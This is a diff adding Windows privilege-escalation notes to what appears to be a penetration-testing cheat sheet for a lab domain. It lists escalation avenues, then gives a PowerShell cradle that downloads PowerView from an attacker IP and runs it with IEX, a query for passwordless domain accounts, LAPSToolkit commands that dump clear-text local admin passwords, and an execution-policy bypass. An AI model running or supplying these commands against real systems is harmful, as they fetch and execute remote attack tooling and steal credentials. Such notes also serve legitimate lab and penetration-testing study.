@@ -1,3 +1,38 @@
+# Windows PrivEsc
+There are various ways of locally escalating privileges on a Windows box:
+
+– Missing patches (PrintNightmare/Hivenightmare)
+
+– Automated deployment, AutoLogon passwords, passwords in files in clear text
+
+– AlwaysInstallElevated (Any user can run MSI as SYSTEM)
+
+– Misconfigured Services
+
+– DLL Hijacking and more
+
+– NTLM Relaying a.k.a. Won't Fix
+
+First run powerview to get an understanding on machine you are on and the role it plays.
+```
+(new-object system.net.webclient).downloadstring('http://10.10.16.161/PowerView.ps1') | IEX
+```
+Check for ms-mcs-admpwd
+
+Check for Passwordless logins
+```
+get-NetUser -domain DEV.ADMIN.OFFSHORE.COM | Where-Object { $_.userAccountControl -band 0x20 } | Select-Object samaccountname,userAccountControl
+```
+
+# LAPSToolkit
+Get-LAPSComputers method from LAPSToolkit to list all computers that are set up with LAPS and display the hostname, the clear text password, and the expiration time:
+
+```
+PS C:\Tools> Import-Module .\LAPSToolkit.ps1
+
+PS C:\Tools> Get-LAPSComputers
+```
+
 Execution policy issues.
 ```
 powershell -ExecutionPolicy Bypass -File script.ps1
